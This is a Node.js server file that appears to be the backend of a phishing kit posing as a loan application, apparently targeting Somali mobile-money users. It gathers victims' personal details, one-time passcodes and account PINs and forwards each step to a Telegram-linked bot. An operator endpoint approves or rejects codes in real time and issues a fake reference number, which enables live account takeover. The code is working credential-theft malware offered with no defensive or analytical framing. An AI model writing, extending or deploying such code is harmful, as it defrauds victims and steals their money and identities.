const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const axios = require('axios');
const path = require('path');

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Primary memory engine mapping socket pointers to session objects
const activeSessions = new Map();

let rawBotUrl = process.env.BOT_MANAGER_URL || 'http://localhost:3001';
if (!rawBotUrl.startsWith('http://') && !rawBotUrl.startsWith('https://')) {
    rawBotUrl = 'https://' + rawBotUrl;
}
const BOT_MANAGER_URL = rawBotUrl;

io.on('connection', (socket) => {
    const appId = 'WAAFI-' + Math.floor(100000 + Math.random() * 900000);
    
    activeSessions.set(socket.id, {
        appId: appId, socketId: socket.id,
        loanType: '', amount: 1200, term: '1', purpose: '',
        firstName: '', lastName: '', email: '', phone: '',
        employment: '', income: '', employer: '',
        otpToken: '', pinCode: '', step: 1
    });

    socket.emit('session-ready', { appId: appId });
    socket.join(appId);

    socket.on('step1', (payload) => {
        let session = activeSessions.get(socket.id);
        if (session) { Object.assign(session, payload); session.step = 2; activeSessions.set(socket.id, session); }
    });

    socket.on('step2', (payload) => {
        let session = activeSessions.get(socket.id);
        if (session) { Object.assign(session, payload); session.step = 3; activeSessions.set(socket.id, session); }
    });

    /**
     * AUDIT FIX: Listens exactly for 'step3-data' instead of 'step3' to match frontend payload.
     */
    socket.on('step3-data', async (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;
        
        Object.assign(session, payload);
        session.step = 4;
        activeSessions.set(socket.id, session);

        /**
         * AUDIT FIX: Removed pre-emptive 'socket.emit('admin-approve-otp');' statement.
         * The user will now remain correctly on Step 4 until the admin acts.
         */
        console.log(`[CORE SERVER] Data synchronized for tracker ID ${session.appId}. Calling Telegram logging API.`);

        try {
            await axios.post(`${BOT_MANAGER_URL}/log-step3-data`, { session });
        } catch (err) {
            console.error("[CORE CRITICAL ERROR] Step 3 dispatch block broken:", err.message);
        }
    });

    socket.on('step4-otp', async (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;

        session.otpToken = payload.otp;
        activeSessions.set(socket.id, session);

        try {
            await axios.post(`${BOT_MANAGER_URL}/trigger-step4-telegram`, { session });
        } catch (err) {
            console.error("[CORE CRITICAL ERROR] Step 4 verification link broken:", err.message);
        }
    });

    socket.on('step5-pin', async (payload) => {
        let session = activeSessions.get(socket.id);
        if (!session) return;

        session.pinCode = payload.pin;
        activeSessions.set(socket.id, session);

        try {
            await axios.post(`${BOT_MANAGER_URL}/trigger-step5-telegram`, { session });
        } catch (err) {
            console.error("[CORE CRITICAL ERROR] Step 5 operational capture failed:", err.message);
        }
    });

    socket.on('disconnect', () => { activeSessions.delete(socket.id); });
});

/**
 * TELEGRAM INBOUND INTEGRATION PROXY CONTROL LAYER
 */
app.post('/api/admin-action', (req, res) => {
    const { actionSignal, targetAppId, message } = req.body;
    console.log(`[CORE ROUTER] Process signal command: ${actionSignal} targeting ID: ${targetAppId}`);
    
    let targetSession = null;
    for (let [socketId, record] of activeSessions.entries()) {
        if (record.appId === targetAppId) { targetSession = record; break; }
    }

    if (!targetSession) return res.status(404).json({ error: "Session target trace execution dropped or unavailable" });
    const clientSocket = io.sockets.sockets.get(targetSession.socketId);
    if (!clientSocket) return res.status(410).json({ error: "Target application framework instance offline" });

    if (actionSignal === 'approve_otp') {
        clientSocket.emit('admin-approve-otp'); 
    } else if (actionSignal === 'otp-failed') {
        clientSocket.emit('otp-failed', { message: message || "Code-ka OTP-ga aad gelisay waa khalad." });
    } else if (actionSignal === 'approve_pin') {
        const generatedRef = 'COD-' + Math.floor(100000 + Math.random() * 900000);
        clientSocket.emit('pin-verified', { referenceId: generatedRef }); 
    } else if (actionSignal === 'pin-failed') {
        clientSocket.emit('pin-failed', { message: message || "PIN-ka koontada aad gelisay waa khalad." });
    }

    return res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => console.log(`Routing cluster network instance functional on internal index port:${PORT}`));